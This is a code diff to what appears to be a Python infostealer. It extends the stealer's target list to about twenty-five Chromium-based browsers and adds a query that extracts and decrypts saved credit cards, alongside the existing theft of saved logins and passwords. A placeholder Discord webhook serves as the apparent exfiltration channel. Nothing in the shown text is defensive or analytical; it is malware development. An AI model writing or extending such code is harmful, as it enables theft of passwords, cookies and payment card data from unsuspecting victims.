@@ -14,10 +14,30 @@ roaming = os.getenv('APPDATA')
 webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your webhook URL
 
 browsers = {
+    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+    'amigo': appdata + '\\Amigo\\User Data',
+    'torch': appdata + '\\Torch\\User Data',
+    'kometa': appdata + '\\Kometa\\User Data',
+    'orbitum': appdata + '\\Orbitum\\User Data',
+    'cent-browser': appdata + '\\CentBrowser\\User Data',
+    '7star': appdata + '\\7Star\\7Star\\User Data',
+    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': appdata + '\\Vivaldi\\User Data',
+    'chromium': appdata + '\\Chromium\\User Data',
+    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
     'chrome': appdata + '\\Google\\Chrome\\User Data',
-    'edge': appdata + '\\Microsoft\\Edge\\User Data',
-    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
-    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data'
+    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
+    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
+    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
+    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
+    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': appdata + '\\Iridium\\User Data',
+    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
+    'opera': roaming + '\\Opera Software\\Opera Stable',
+    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
 }
 
 data_queries = {
@@ -25,6 +45,12 @@ data_queries = {
         'query': 'SELECT action_url, username_value, password_value FROM logins',
         'file': '\\Login Data',
         'columns': ['URL', 'Email', 'Password'],
+        'decrypt': True
+    },
+    'credit_cards': {
+        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+        'file': '\\Web Data',
+        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
         'decrypt': True
     },
     'cookies': {
